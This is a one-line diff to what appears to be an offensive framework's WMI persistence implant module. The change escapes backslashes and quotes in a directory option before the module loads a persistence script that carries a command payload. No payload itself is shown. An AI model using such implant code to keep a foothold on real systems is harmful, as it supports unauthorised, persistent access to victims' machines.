@@ -76,6 +76,7 @@ class WMIPersistImplant(core.implant.Implant):
             return
 
         self.options.set("CMD", payload)
+        self.options.set("DIRECTORY", self.options.get('DIRECTORY').replace("\\", "\\\\").replace('"', '\\"'))
         payloads = {}
         payloads["js"] = self.loader.load_script("data/implant/persist/wmi.js", self.options)
 
